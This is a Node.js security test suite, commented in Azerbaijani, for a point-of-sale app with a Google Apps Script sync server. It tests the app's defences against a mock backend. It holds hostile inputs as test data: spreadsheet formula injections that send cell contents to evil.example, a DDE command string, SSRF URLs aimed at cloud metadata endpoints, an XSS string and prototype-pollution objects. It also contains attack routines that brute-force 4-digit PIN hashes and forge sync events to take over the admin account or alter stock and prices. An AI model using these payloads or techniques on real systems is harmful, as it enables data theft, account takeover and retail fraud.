/* node tests/security.test.js — "hakerin gözü ilə" yoxlama: Apps Script serveri (Code.gs, vm-də) + cihazların sinxron qəbulu (replica) + giriş.
   İki cür nəticə var:
     ✓ / ✗  — MÜDAFİƏ: bu təhlükəsiz davranış pozulmamalıdır (✗ olsa test uğursuzdur, exit 1).
     ⚠ RİSK — HÜCUM UĞURLUDUR: arxitekturadan gələn, kod ilə tam bağlanmayan boşluq. Test uğursuz sayılmır, amma hesabata düşür
              (token-i bilən şəxs nə edə bilər). Kod dəyişəndə RİSK "müdafiə"yə çevrilə bilər.
   Hücumçu modeli: yalnız SYNC_TOKEN + skript ünvanını bilir (məs. kassanın brauzer alətlərindən oxuyub) və brauzersiz birbaşa serverə sorğu göndərir. */
const assert = require('assert');
const vm = require('vm');
const fs = require('fs');
const path = require('path');
const nodeCrypto = require('crypto');
const { IDBFactory, IDBKeyRange } = require('fake-indexeddb');
const { makeBackend } = require('./gas-mock.js');

const URL_OK = 'https://script.google.com/macros/s/AKfycbTEST/exec';
const TOKEN = 'Xk3-test-token-0123456789abcdefghij';
const JS = path.join(__dirname, '..', 'js');

function makeDevice(backend, idb, extra) {
  const ctx = Object.assign({
    console, setTimeout, clearTimeout, TextEncoder, DOMException, AbortController,
    crypto: nodeCrypto.webcrypto, indexedDB: idb || new IDBFactory(), IDBKeyRange,
    navigator: { onLine: true }, fetch: backend.fetch()
  }, extra || {});
  ctx.window = ctx; ctx.globalThis = ctx;
  vm.createContext(ctx);
  ['money', 'barcode', 'rules', 'fifo', 'db', 'services', 'replica', 'sync'].forEach(f => vm.runInContext(fs.readFileSync(path.join(JS, f + '.js'), 'utf8'), ctx, { filename: f + '.js' }));
  ctx.Sync.kick = () => {};
  return ctx;
}
async function boot(backend) { const d = makeDevice(backend); await d.Services.init(); const r = await d.Sync.connect(URL_OK, TOKEN); assert.ok(!r.error, r.error); return d; }
async function loginAs(d, name, pin) { const u = (await d.Services.listUsers()).find(x => x.name === name); return d.Services.login(u.id, pin); }
async function rejects(p, re) { try { await p; } catch (e) { if (re && !re.test(e.message)) throw new Error('Gözlənilməyən xəta: ' + e.message); return e; } throw new Error('Xəta gözlənilirdi'); }
async function sync(...ds) { for (let i = 0; i < 3; i++) for (const d of ds) await d.Sync.cycle(); }
const sha = s => nodeCrypto.createHash('sha256').update(s, 'utf8').digest('hex');

const findings = [];
let passed = 0, failed = 0, risks = 0;
async function must(name, fn) { try { await fn(); passed++; console.log('✓ ' + name); } catch (e) { failed++; console.log('✗ ' + name + '\n   ' + (e.stack || e.message).split('\n').slice(0, 4).join('\n   ')); findings.push({ kind: 'FAIL', name, detail: e.message }); } }
// fn qaytarır: { exploited: bool, detail } — exploited=true "hücum uğurludur"
async function risk(name, fn) {
  try { const r = await fn();
    if (r.exploited) { risks++; console.log('⚠ RİSK  ' + name + (r.detail ? '\n          → ' + r.detail : '')); findings.push({ kind: 'RISK', name, detail: r.detail || '' }); }
    else { passed++; console.log('✓ (hücum uğursuz) ' + name + (r.detail ? ' — ' + r.detail : '')); findings.push({ kind: 'BLOCKED', name, detail: r.detail || '' }); }
  } catch (e) { failed++; console.log('✗ ' + name + '\n   ' + (e.stack || e.message).split('\n').slice(0, 4).join('\n   ')); findings.push({ kind: 'FAIL', name, detail: e.message }); }
}

(async () => {
  const be = makeBackend({ token: TOKEN });
  // Sheets-ə gedən XAM dəyərləri tuturuq (mock baş ' simvolunu silir; düstur qorunması üçün xam dəyər lazımdır)
  const raw = [];
  const Rg = Object.getPrototypeOf(be.store.sheets.Events.getRange(1, 1, 1, 1));
  const origSet = Rg.setValues; Rg.setValues = function (v) { v.forEach(r => r.forEach(c => raw.push({ sheet: this.sh.name, v: c }))); return origSet.call(this, v); };
  const Sh = Object.getPrototypeOf(be.store.sheets.Events); const origApp = Sh.appendRow; Sh.appendRow = function (r) { r.forEach(c => raw.push({ sheet: this.name, v: c })); return origApp.call(this, r); };

  let evN = 0;
  const forge = (type, data, o) => { o = o || {}; const at = o.at || new Date().toISOString(); return { id: at + '_' + String(++evN).padStart(6, '0') + '_a_evil' + evN, at, type, userId: o.userId == null ? 'u_admin' : o.userId, device: 'evil_dev', data }; };
  const atk = (items, body) => be.post(Object.assign({ action: 'sync', token: TOKEN, device: 'evil_dev', since: 0, items, limit: 1 }, body || {}));
  const eventsCount = () => be.rows('Events').length;

  /* ===================== A. SERVER: giriş və giriş məlumatlarının yoxlanması ===================== */
  console.log('\n— A. Server (Code.gs): açar və sorğu yoxlaması —');

  await must('doGet açarsız cavabı yalnız ümumi vəziyyət göstərir (açar, ID, hash, e-poçt yoxdur)', async () => {
    const g = be.get();
    assert.deepStrictEqual(Object.keys(g).sort(), ['missingSheets', 'ok', 'service', 'tokenSet', 'version']);
    const s = JSON.stringify(g); assert.ok(!s.includes(TOKEN) && !/@|pinHash|salt/.test(s));
  });

  await must('açarsız / yanlış tipli / uyğun olmayan açarlı sorğular rədd olunur və cədvələ toxunmur', async () => {
    const before = JSON.stringify(Object.keys(be.store.sheets).map(k => be.store.sheets[k].rows.length));
    const item = forge('product.created', { product: { id: 'p_x', name: 'X' } });
    const bad = [undefined, null, '', 'wrong', TOKEN + 'x', TOKEN.slice(0, -1), TOKEN.toUpperCase(), ' ' + TOKEN, [TOKEN], { toString: () => TOKEN }, 0, false, true, TOKEN + '\0', TOKEN.split('').reverse().join('')];
    for (const t of bad) {
      const r = be.post({ action: 'sync', token: t, device: 'e', since: 0, items: [item], limit: 5 });
      assert.strictEqual(r.ok, false, 'qəbul olundu: ' + JSON.stringify(t)); assert.strictEqual(r.error, 'İcazə yoxdur');
      assert.ok(!('events' in r), 'məlumat sızdı');
    }
    for (const body of [{ action: 'sync', device: 'e', items: [item] }, { action: 'allocate', key: 'receiptSeq', count: 5 }, { action: 'push.key' }, { action: 'push.register', device: 'd', endpoint: 'https://fcm.googleapis.com/x' }]) {
      const r = be.post(body); assert.strictEqual(r.ok, false);
    }
    assert.strictEqual(JSON.stringify(Object.keys(be.store.sheets).map(k => be.store.sheets[k].rows.length)), before, 'cədvəllər dəyişməyib');
  });

  await must('SYNC_TOKEN təyin olunmayıbsa heç bir sorğu keçmir (boş açar = açıq qapı deyil)', async () => {
    const b2 = makeBackend({ token: null });
    for (const t of [undefined, null, '', 'x']) assert.strictEqual(b2.post({ action: 'sync', token: t, items: [], since: 0 }).ok, false);
    assert.strictEqual(b2.post({ action: 'ping', token: '' }).ok, false);
  });

  await must('pozuq gövdələr serveri çökdürmür (null, rəqəm, massiv, sətir, çox böyük)', async () => {
    for (const b of ['null', '5', '"x"', '[]', 'true', '{}', '{', '', 'undefined', '[1,2', '{"token":', JSON.stringify({ token: 'x'.repeat(2e6) })]) {
      let out; try { out = be.post(b); } catch (e) { throw new Error('doPost istisna atdı gövdə=' + String(b).slice(0, 30) + ': ' + e.message); }
      assert.strictEqual(out.ok, false);
    }
  });

  await must('sorğu limitləri: 300-dən çox hadisə rədd, since/limit/count dəyərləri sıxışdırılır', async () => {
    const many = Array.from({ length: 301 }, () => forge('x.y', {}));
    const r = atk(many); assert.strictEqual(r.ok, false); assert.ok(/ən çox 300/.test(r.error));
    const before = eventsCount();
    for (const since of [-5, 'abc', null, 1e15, NaN, {}, [], '9'.repeat(30)]) { const o = atk([], { since, limit: 1e9 }); assert.ok(o.ok === true || o.ok === false); if (o.ok) assert.ok(o.events.length <= 500); }
    const b = atk([], { alloc: [{ key: 'receiptSeq', count: 1e12 }, { key: 'productSeq', count: -1e9, min: 'x' }, { key: '__proto__', count: 5 }, { key: 'constructor', count: 5 }, null, 5, 'a'] });
    if (b.ok) { assert.ok(b.blocks.every(x => x.to - x.from < 1000), 'nömrə aralığı 1000-dən böyük olmamalıdır'); assert.ok(b.blocks.every(x => x.key === 'receiptSeq' || x.key === 'productSeq')); }
    assert.strictEqual(eventsCount(), before);
  });

  await must('təsadüfi (fuzz) gövdələr: 600 sorğu, heç biri istisna atmır, cavab həmişə {ok:...}', async () => {
    let seed = 12345; const rnd = () => (seed = (seed * 1103515245 + 12345) & 0x7fffffff) / 0x7fffffff;
    const pick = a => a[Math.floor(rnd() * a.length)];
    const junk = () => pick([null, undefined, 0, -1, 1e21, NaN, '', 'x', '=1+1', '__proto__', [], [null], [{}], {}, { id: 1 }, { id: 'a', data: 5 }, { id: 'a', data: null, type: {} }, { id: 'a', type: 'sale.created', data: { sale: 5 } }, { id: 'b', type: 'product.created', data: { product: null } },
      { id: 'c', type: 'user.upserted', data: { user: { id: 7 } } }, { id: 'd', type: 'shift.opened', data: {} }, { id: 'e', type: 'cash.in', data: { move: [] } }, true, false, 'x'.repeat(1000)]);
    for (let i = 0; i < 600; i++) {
      const body = { action: pick(['sync', 'allocate', 'ping', 'push.key', 'push.register', 'push.unregister', 'push.test', 'zzz', undefined]), token: rnd() < 0.9 ? TOKEN : junk() };
      for (const k of ['items', 'since', 'limit', 'device', 'alloc', 'key', 'count', 'min', 'endpoint', 'perms', 'userId', 'userName', 'role']) if (rnd() < 0.5) body[k] = rnd() < 0.5 ? junk() : (k === 'items' || k === 'alloc' || k === 'perms' ? [junk(), junk()] : junk());
      let out; try { out = be.post(body); } catch (e) { throw new Error('istisna: ' + e.message + ' gövdə=' + JSON.stringify(body).slice(0, 200)); }
      assert.ok(out && typeof out.ok === 'boolean');
    }
  });

  await must('təkrar hadisə (eyni id) bir dəfə yazılır, ikinci dəfə də "qəbul olundu" deyilir', async () => {
    const e = forge('admin.store_changed', { store: { name: 'T' } });
    const n0 = eventsCount();
    const r1 = atk([e]), r2 = atk([e]);
    assert.deepStrictEqual(r1.acked, [e.id]); assert.deepStrictEqual(r2.acked, [e.id]);
    assert.strictEqual(eventsCount(), n0 + 1);
  });

  await must('Sheets düstur inyeksiyası: bütün mətn sahələrində =,+,-,@ ilə başlayan dəyərin əvvəlinə \' qoyulur', async () => {
    const PAY = ['=HYPERLINK("http://evil.example/?"&A1,"x")', '+1+1', '-1+1', '@SUM(1,1)', '\t=1+1', ' =1+1', '=IMPORTXML("http://evil.example","//a")', "'=1+1", '=cmd|\' /C calc\'!A0'];
    for (const P of PAY) {
      raw.length = 0;
      const at = new Date().toISOString();
      const mk = (type, data) => forge(type, data, { at });
      const items = [
        mk('product.created', { product: { id: 'p_' + evN, name: P, category: P, brand: P, ageGroup: P, storeBarcode: P, mfrBarcode: P, price: 100, avgCost: 1, lastCost: 1, minStock: 1, active: true } }),
        mk('supplier.upserted', { supplier: { id: 's_' + evN, name: P, phone: P, note: P, active: true, updatedAt: at } }),
        mk('user.upserted', { user: { id: 'u_f' + evN, name: P, role: P, active: true, mustChangePin: true, updatedAt: at, salt: P, pinHash: P } }),
        mk('sale.created', { sale: { id: 'sl_' + evN, receiptNo: P, at, shiftId: P, cashierId: P, cashierName: P, totals: { subtotal: 1, discount: 0, total: 1 }, discount: { percent: P, approvedByName: P }, payment: { method: P, bankType: P, cashPart: 1, bankPart: 0, cashReceived: 1, change: 0 }, offline: false, fiscal: { id: P, status: P }, lines: [{ productId: P, name: P, storeBarcode: P, qty: 1, price: 1, unitCost: 1, negative: false }] } }),
        mk('return.created', { ret: { id: 'r_' + evN, saleId: P, receiptNo: P, at, amount: 1, cashAmount: 1, bankAmount: 0, bankType: P, approvedByName: P, reason: P } }),
        mk('stock.received', { productId: P, qty: 1, unitCost: 1, supplierId: P, lotId: P, note: P, at }),
        mk('cash.in', { move: { id: 'c_' + evN, shiftId: P, type: P, amount: 1, reason: P, at, userId: P, approvedBy: P } }),
        mk('shift.opened', { shift: { id: 'sh_' + evN, status: P, openedAt: at, openedBy: P, openingCash: 1, note: P } }),
        Object.assign(mk(P, { a: P }), { userId: P, device: P }),
        { id: P + evN, at: P, type: 'auth.login', userId: P, device: P, data: { x: P } }
      ];
      const r = atk(items); assert.strictEqual(r.ok, true, r.error);
      assert.ok(raw.length > 50);
      const bad = raw.filter(c => typeof c.v === 'string' && /^[=+\-@\t\r\n ]/.test(c.v));
      assert.strictEqual(bad.length, 0, 'qorunmamış xam dəyər(lər): ' + bad.slice(0, 3).map(b => b.sheet + ':' + JSON.stringify(b.v)).join(' | '));
    }
  });

  await must('Push qeydiyyatı: yalnız tanınan push xidmətlərinin ünvanları qəbul edilir (SSRF/məlumat sızması yoxdur)', async () => {
    const evil = ['http://fcm.googleapis.com/x', 'https://evil.example/fcm.googleapis.com/', 'https://fcm.googleapis.com.evil.example/x', 'https://fcm.googleapis.com@evil.example/x', 'https://evil.example/?u=https://fcm.googleapis.com/',
      'https://fcm.googleapis.com:443@evil.example/', 'https://127.0.0.1/', 'https://localhost/', 'https://169.254.169.254/computeMetadata/v1/', 'https://metadata.google.internal/', 'https://evil.example#.googleapis.com/', 'https://evilgoogleapis.com/x',
      'https://updates.push.services.mozilla.com.evil.example/', 'ftp://fcm.googleapis.com/', 'javascript:alert(1)', '//fcm.googleapis.com/x', 'https://x.googleapis.com\\@evil.example/', 'https://script.google.com/macros/s/AKfy/exec', 'https://' + 'a'.repeat(1100) + '.googleapis.com/'];
    for (const ep of evil) {
      const n = be.rows('Push').length; const r = be.post({ action: 'push.register', token: TOKEN, device: 'dev_ssrf', endpoint: ep, userId: 'u', perms: ['pos.sell'] });
      assert.strictEqual(r.ok, false, 'qəbul olundu: ' + ep); assert.strictEqual(be.rows('Push').length, n);
    }
    be.post({ action: 'push.register', token: TOKEN, device: 'dev_ok', endpoint: 'https://fcm.googleapis.com/fcm/send/abc', userId: 'u', perms: ['pos.sell', 'x'.repeat(100), 5, '../..'] });
    const row = be.rows('Push').find(r => r[0] === 'dev_ok'); assert.ok(row); assert.strictEqual(row[4], 'pos.sell');
  });

  await must('VAPID gizli açarı heç bir cavabda yoxdur', async () => {
    const dump = JSON.stringify([be.post({ action: 'push.key', token: TOKEN }), be.post({ action: 'ping', token: TOKEN }), be.get(), atk([], { since: 0, limit: 500 })]);
    const priv = be.store.props.VAPID_PRIVATE; assert.ok(priv && priv.length >= 60); assert.ok(!dump.includes(priv)); assert.ok(!dump.includes(TOKEN));
  });

  /* ===================== B. Cihaz tərəfi: saxta hadisələr (token-i bilən hücumçu) ===================== */
  console.log('\n— B. Saxta hadisələr (hücumçu yalnız token-i bilir, brauzersiz serverə yazır) —');
  const K = await boot(be), M = await boot(be), C = await boot(be);    // kassir, menecer, admin cihazları
  await loginAs(M, 'Menecer', '2222');
  const toy = (await M.Services.createProduct({ name: 'Konstruktor', price: 1450, cost: 900 })).product;
  await M.Services.receiveStock(toy.id, 20, 900, '', null).catch(() => {});
  await loginAs(C, 'Admin', '1234'); await loginAs(K, 'Kassir', '1111');
  await sync(M, K, C);
  const stock = async d => (await d.Services.listProducts()).find(p => p.id === toy.id).stock;
  const baseStock = await stock(K);

  await risk('RİSK-1 PIN hash-ları: token-i bilən hər kəs serverdən bütün istifadəçilərin duz+hash-ını oxuyur və 4 rəqəmli PIN-i saniyələrdə tapır', async () => {
    const pulled = be.post({ action: 'sync', token: TOKEN, device: 'evil_dev', since: 0, items: [], limit: 500 }).events;
    const ups = pulled.filter(e => e.type === 'user.upserted' && e.data && e.data.user && e.data.user.pinHash);
    const last = {}; ups.forEach(e => { last[e.data.user.id] = e.data.user; });
    const t0 = Date.now(); const cracked = {};
    Object.values(last).forEach(u => { for (let i = 0; i < 1e4; i++) { const p = String(i).padStart(4, '0'); if (sha(u.salt + ':' + p) === u.pinHash) { cracked[u.id] = true; break; } } });
    const ms = Date.now() - t0;
    return { exploited: Object.keys(cracked).length > 0, detail: `${Object.keys(last).length} istifadəçidən ${Object.keys(cracked).length}-nin 4 rəqəmli PIN-i ${ms} ms-ə tapıldı (tək nüvə; ${(1e4 / Math.max(ms, 1) * 1000).toFixed(0)} cəhd/san)` };
  });

  await risk('RİSK-2 Saxta "user.upserted": hücumçu Admin-in PIN hash-ını əvəz edir, sonra Admin kimi giriş edir (PIN bilmədən)', async () => {
    const salt = 'aa11'.repeat(8), at = new Date(Date.now() + 1000).toISOString();
    const adm = await C.DB.get('users', 'u_admin');
    atk([forge('user.upserted', { user: Object.assign({}, adm, { salt, pinHash: sha(salt + ':' + 'Hack-9999'), updatedAt: at, mustChangePin: false }), reason: 'pin_changed' }, { at })]);
    await sync(K);
    let ok = false; try { await loginAs(K, 'Admin', 'Hack-9999'); ok = true; } catch (e) { ok = false; }
    // yenidən düzəldirik ki, sonrakı testlər pozulmasın
    const fix = Object.assign({}, adm, { updatedAt: new Date(Date.now() + 2000).toISOString() });
    atk([forge('user.upserted', { user: fix, reason: 'restore' }, { at: fix.updatedAt })]); await sync(K, M, C); K.Services.logout();
    return { exploited: ok, detail: ok ? 'hücumçu Admin hesabına daxil oldu (icazələr, PIN sıfırlama, istifadəçi yaratma açılır)' : '' };
  });

  await risk('RİSK-3 Saxta "admin.matrix_changed": Kassirə bütün icazələr verilir, kassir mal qəbul edir və qiymət dəyişir', async () => {
    const m = JSON.parse(JSON.stringify(await K.Services.getMatrix()));
    const all = vm.runInContext('Object.keys(Rules.PERMISSIONS)', K); m.kassir = Array.from(all);
    const at = new Date(Date.now() + 3000).toISOString();
    atk([forge('admin.matrix_changed', { before: null, after: m, v: 99 }, { at })]); await sync(K, M, C);
    await loginAs(K, 'Kassir', '1111');
    let ok = false; try { await K.Services.receiveStock(toy.id, 1, 1, '', null); ok = true; } catch (e) { ok = false; }
    return { exploited: ok, detail: ok ? 'Kassir icazəsiz mal qəbulu etdi' : '' };
  });
  // matrisi bərpa et (admin cihazından, daha yeni vaxtla)
  { const m = vm.runInContext('Rules.upgradeMatrix(JSON.parse(JSON.stringify(Rules.DEFAULT_MATRIX)))', C); atk([forge('admin.matrix_changed', { after: m, v: 99 }, { at: new Date(Date.now() + 5000).toISOString() })]); await sync(K, M, C); await K.Services.receiveStock(toy.id, 1, 1, '', null).then(() => { throw new Error('bərpa olunmadı'); }, () => {}); }

  await risk('RİSK-4 Saxta "approval.decided": kassir öz sorğusunu menecer adından təsdiqləyir (menecer təsdiqi atlanır)', async () => {
    const ap = await K.Services.requestApproval('line_delete', 'pos.line.delete', 'x', null, null);
    atk([forge('approval.decided', { id: ap.id, decision: 'approved', by: { id: 'u_menecer', name: 'Əli İbrahimli' }, decidedAt: new Date().toISOString() }, { userId: 'u_menecer' })]);
    await sync(K);
    const st = (await K.DB.get('approvals', ap.id)).status;
    return { exploited: st === 'approved', detail: st === 'approved' ? 'sorğu "təsdiqləndi" oldu; kassa əməliyyatı menecer olmadan icra olunur' : '' };
  });

  await risk('RİSK-5 Saxta "stock.received" / "sale.created": qalıq mənimsənilir (oğurluğu gizlətmək üçün)', async () => {
    const before = await stock(K);
    atk([forge('stock.received', { productId: toy.id, qty: 500, unitCost: 1, lotId: 'lot_evil', note: 'x', at: new Date().toISOString() }, { userId: 'u_menecer' })]);
    await sync(K, M);
    const after = await stock(K);
    return { exploited: after === before + 500, detail: `qalıq ${before} → ${after}; Audit/Events-də "u_menecer" adı ilə görünür` };
  });

  await risk('RİSK-6 Saxta "product.updated": qiyməti 1 qəpiyə endirir (LWW qaydası ən yeni vaxtı qəbul edir)', async () => {
    const p = await K.DB.get('products', toy.id);
    atk([forge('product.updated', { id: toy.id, after: Object.assign({}, p, { price: 1 }) }, { at: new Date(Date.now() + 6000).toISOString() })]);
    await sync(K, M, C);
    const price = (await K.DB.get('products', toy.id)).price;
    const fix = Object.assign({}, p, { price: 1450 }); atk([forge('product.updated', { id: toy.id, after: fix }, { at: new Date(Date.now() + 9000).toISOString() })]); await sync(K, M, C);
    return { exploited: price === 1, detail: price === 1 ? 'qiymət 0.01 AZN oldu' : '' };
  });

  console.log('\n— C. Pozuq / zərərli məlumat: cihazlar çökməməli, sinxron donmamalıdır —');
  const lastCheck = async (label) => {          // arxasınca gələn SAĞLAM hadisə tətbiq olunmalıdır (sinxron "zəhərli" hadisədə ilişməyib)
    const mark = 'Marker-' + label + '-' + nodeCrypto.randomUUID().slice(0, 6);
    atk([forge('admin.store_changed', { store: { name: mark, voen: '1', address: 'a' } }, { at: new Date(Date.now() + 20000 + evN).toISOString() })]);
    await sync(K, M, C);
    for (const [n, d] of [['K', K], ['M', M], ['C', C]]) assert.strictEqual((await d.Services.storeInfo()).name, mark, label + ': ' + n + ' cihazı sağlam hadisəni almadı (sinxron ilişib)');
  };

  await must('"zəhərli" id-lər (obyekt/massiv/null/boş) sinxronu dondurmur və qalıq pozulmur', async () => {
    const at = new Date().toISOString();
    const items = [
      forge('user.upserted', { user: { id: {}, name: 'x', role: 'admin' } }), forge('user.upserted', { user: { id: [], name: 'x' } }), forge('user.upserted', { user: { id: ['a'], name: 'x' } }),
      forge('product.created', { product: { id: {}, name: 'x', storeBarcode: 'z' } }), forge('product.updated', { id: {}, after: { id: {}, name: 'x' } }),
      forge('supplier.upserted', { supplier: { id: {}, name: 'x' } }), forge('stock.received', { productId: {}, qty: 5, unitCost: 1, lotId: {}, approvalId: {} }),
      forge('stock.received', { productId: toy.id, qty: 5, unitCost: 1, lotId: {}, approvalId: 'ap_x' }), forge('approval.decided', { id: {} }), forge('approval.requested', { approval: { id: {} } }),
      forge('shift.opened', { shift: { id: {} } }), forge('cash.in', { move: { id: [] } }), forge('sale.created', { sale: { id: {}, receiptNo: 1, lines: [] } }), forge('return.created', { ret: { id: {}, lines: [] } }),
      { id: {}, at, type: 'user.upserted', userId: '', device: 'evil', data: {} }, { id: '', at, type: 'user.upserted', userId: '', device: 'evil', data: {} }
    ];
    const b4 = await stock(K);
    const r = atk(items); assert.strictEqual(r.ok, true, r.error);
    await lastCheck('zəhərli-id');
    assert.strictEqual(await stock(K), b4, 'qalıq dəyişməməlidir');
  });

  await must('qalıq/qiymət sahələrinə yanlış tip (mətn, NaN, mənfi, nəhəng, kəsr) yazılmır; qalıq həmişə tam ədəd qalır', async () => {
    const p = await K.DB.get('products', toy.id);
    const bad = ['abc', '<img src=x onerror=alert(1)>', {}, [], null, NaN, -5, 1.5, 1e300, '5', true];
    const items = [];
    for (const q of bad) {
      items.push(forge('sale.created', { sale: { id: 'sl_bad' + (evN + items.length), receiptNo: 900000 + items.length, at: new Date().toISOString(), shiftId: 'x', cashierId: 'u_kassir', cashierName: 'K', totals: { subtotal: 1, discount: 0, total: 1 }, payment: { method: 'cash', cashPart: 1, bankPart: 0, cashReceived: 1, change: 0 }, fiscal: { status: 'x' }, lines: [{ productId: toy.id, name: 'x', storeBarcode: 'z', qty: q, price: 1, unitCost: 1 }] } }));
      items.push(forge('stock.received', { productId: toy.id, qty: q, unitCost: 1, lotId: 'lot_b' + items.length, at: new Date().toISOString() }));
      items.push(forge('return.created', { ret: { id: 'rt_bad' + items.length, saleId: 's', receiptNo: 1, at: new Date().toISOString(), amount: 1, lines: [{ productId: toy.id, name: 'x', qty: q, price: 1 }] } }));
      items.push(forge('product.updated', { id: toy.id, after: Object.assign({}, p, { price: q, minStock: q, name: q, active: q }) }, { at: new Date(Date.now() + 30000 + items.length).toISOString() }));
    }
    for (let i = 0; i < items.length; i += 100) assert.strictEqual(atk(items.slice(i, i + 100)).ok, true);
    await sync(K, M, C);
    for (const [n, d] of [['K', K], ['M', M], ['C', C]]) {
      const q = await d.DB.get('products', toy.id);
      assert.ok(Number.isInteger(q.stock), n + ': qalıq tam ədəd deyil: ' + q.stock);
      assert.ok(Number.isInteger(q.price) && q.price >= 0 && q.price < 1e10, n + ': qiymət pozulub: ' + q.price);
      assert.strictEqual(typeof q.name, 'string', n + ': ad mətn deyil'); assert.strictEqual(typeof q.active, 'boolean', n + ': active məntiqi deyil');
      assert.ok(Number.isInteger(q.minStock) && q.minStock >= 0, n + ': minStock pozulub');
      await d.Services.listProducts();                             // siyahı çökmür
    }
  });

  await must('məhsul/təchizatçı/istifadəçi adı tip pozuntusu (rəqəm, obyekt, nəhəng) UI-ni çökdürmür', async () => {
    const at = new Date(Date.now() + 40000).toISOString();
    atk([forge('product.created', { product: { id: 'p_numname', name: 12345, category: {}, brand: [], ageGroup: null, storeBarcode: '2099999999990', mfrBarcode: 5, price: 100, avgCost: 0, lastCost: 0, minStock: 0, stock: 0, active: true, createdAt: at, updatedAt: at } }),
      forge('product.created', { product: { id: 'p_hugename', name: 'A'.repeat(200000), category: 'x', brand: 'x', ageGroup: 'x', storeBarcode: '2099999999991', mfrBarcode: '', price: 100, avgCost: 0, lastCost: 0, minStock: 0, stock: 0, active: true } }),
      forge('supplier.upserted', { supplier: { id: 's_num', name: 55, phone: {}, note: [], active: 'yes', updatedAt: at } }),
      forge('user.upserted', { user: { id: 'u_numname', name: 99, role: 'çoxqəribə', active: true, mustChangePin: false, salt: 'a', pinHash: 'b', updatedAt: at } })]);
    await sync(K, M, C);
    for (const d of [K, M, C]) {
      const ps = await d.Services.listProducts();
      ps.forEach(p => { assert.strictEqual(typeof p.name, 'string'); assert.ok(p.name.length <= 500, 'nəhəng ad saxlanıb: ' + p.name.length); });
      await d.Services.listUsers(); await d.Services.listSuppliers().catch(() => {});
      for (const p of ps) { String(p.name).toLocaleLowerCase('az'); }
    }
    const us = await C.Services.listAllUsers(); us.forEach(u => assert.strictEqual(typeof u.name, 'string'));
    assert.ok(!us.some(u => u.id === 'u_numname' && u.role === 'çoxqəribə'), 'naməlum rollu istifadəçi qəbul edilməyib');
  });

  await must('prototype pollution: "__proto__"/"constructor" açarları Object.prototype-i dəyişmir', async () => {
    const evil = JSON.parse('{"__proto__":{"polluted":"yes","role":"admin"},"constructor":{"prototype":{"polluted2":"yes"}}}');
    const at = new Date(Date.now() + 50000).toISOString();
    const evs = [forge('user.upserted', { user: Object.assign({ id: 'u_pp', name: 'pp', role: 'kassir', active: true, mustChangePin: true, salt: 'a', pinHash: 'b', updatedAt: at }, JSON.parse('{"__proto__":{"polluted":"yes"}}')) }),
      forge('product.updated', { id: toy.id, after: evil }, { at }), forge('approval.decided', { id: 'x', decision: 'approved', by: JSON.parse('{"__proto__":{"polluted":"yes"},"id":"u"}') }),
      forge('admin.matrix_changed', { after: JSON.parse('{"__proto__":{"polluted":"yes"},"kassir":["pos.sell"],"admin":["admin.permissions"],"menecer":[],"muhasib":[]}'), v: 99 }, { at: new Date(Date.now() + 51000).toISOString() }),
      forge('stock.received', JSON.parse('{"__proto__":{"polluted":"yes"},"productId":"x","qty":1}'))];
    atk(evs); await sync(K, M, C);
    for (const d of [K, M, C]) { assert.strictEqual(vm.runInContext('({}).polluted', d), undefined); assert.strictEqual(vm.runInContext('({}).role', d), undefined); }
    assert.strictEqual(({}).polluted, undefined);
    const m = { after: vm.runInContext('Rules.upgradeMatrix(JSON.parse(JSON.stringify(Rules.DEFAULT_MATRIX)))', C) };
    atk([forge('admin.matrix_changed', { after: m.after, v: 99 }, { at: new Date(Date.now() + 52000).toISOString() })]); await sync(K, M, C);
  });

  await must('nəhəng yük (1 MB məlumat) olan hadisə cihazı dondurmur və sonrakı hadisələr gəlir', async () => {
    const big = 'Z'.repeat(1e6);
    const t0 = Date.now();
    atk([forge('admin.store_changed', { store: { name: big, voen: big, address: big } }, { at: new Date(Date.now() + 60000).toISOString() }), forge('audit.note', { x: big })]);
    await lastCheck('nəhəng');
    assert.ok(Date.now() - t0 < 20000, 'çox yavaş: ' + (Date.now() - t0) + ' ms');
  });

  /* ===================== D. Giriş (PIN) ===================== */
  console.log('\n— D. Giriş və PIN —');
  await must('hər istifadəçinin duzu fərqlidir; eyni PIN fərqli hash verir; PIN düz mətn kimi heç yerdə yoxdur', async () => {
    const us = await C.DB.getAll('users');
    assert.strictEqual(new Set(us.map(u => u.salt)).size, us.length);
    assert.strictEqual(new Set(us.map(u => u.pinHash)).size, us.length);
    const dump = JSON.stringify([await C.DB.getAll('audit'), await C.DB.getAll('outbox'), be.rows('Events'), be.rows('Audit'), be.logs]);
    for (const pin of ['1111', '2222', '1234']) assert.ok(!new RegExp('"pin"\\s*:\\s*"' + pin + '"').test(dump));
    assert.ok(!be.rows('Audit').some(r => /pinHash|salt/.test(String(r[3]))), 'Audit vərəqinə hash düşməyib');
  });

  await must('5 yanlış PIN → 5 dəqiqə blok (eyni səhifə daxilində)', async () => {
    const u = (await K.Services.listUsers()).find(x => x.name === 'Kassir');
    for (let i = 0; i < 5; i++) await rejects(K.Services.login(u.id, '0000'), /PIN səhvdir/);
    await rejects(K.Services.login(u.id, '1111'), /Çox səhv cəhd/);       // doğru PIN də bloklanır
  });

  await must('blok səhifə yenilənəndən (F5) sonra da qalır — brauzer yenilənməsi cəhd sayğacını sıfırlamır', async () => {
    const idb = new IDBFactory(); const be2 = makeBackend({ token: TOKEN });
    let d = makeDevice(be2, idb); await d.Services.init();
    const u = (await d.Services.listUsers()).find(x => x.name === 'Kassir');
    for (let i = 0; i < 5; i++) await rejects(d.Services.login(u.id, '0000'), /PIN səhvdir/);
    d = makeDevice(be2, idb); await d.Services.init();                    // "F5": modullar yenidən yüklənir, IndexedDB eynidir
    await rejects(d.Services.login(u.id, '1111'), /Çox səhv cəhd/);
  });

  await must('uğurlu giriş sayğacı sıfırlayır; başqa istifadəçinin bloku bu istifadəçiyə keçmir', async () => {
    const idb = new IDBFactory(); const be2 = makeBackend({ token: TOKEN });
    const d = makeDevice(be2, idb); await d.Services.init();
    const us = await d.Services.listUsers(); const k = us.find(x => x.name === 'Kassir'), m = us.find(x => x.name === 'Menecer');
    for (let i = 0; i < 4; i++) await rejects(d.Services.login(k.id, '0000'), /PIN səhvdir/);
    await d.Services.login(k.id, '1111'); d.Services.logout();
    for (let i = 0; i < 4; i++) await rejects(d.Services.login(k.id, '0000'), /PIN səhvdir/);     // sayğac sıfırlanıb: 4 cəhd yenə blok deyil
    for (let i = 0; i < 5; i++) await rejects(d.Services.login(m.id, '0000'), /PIN səhvdir|Çox səhv/);
    await d.Services.login(k.id, '1111');                                                          // Kassir bloklanmayıb
  });

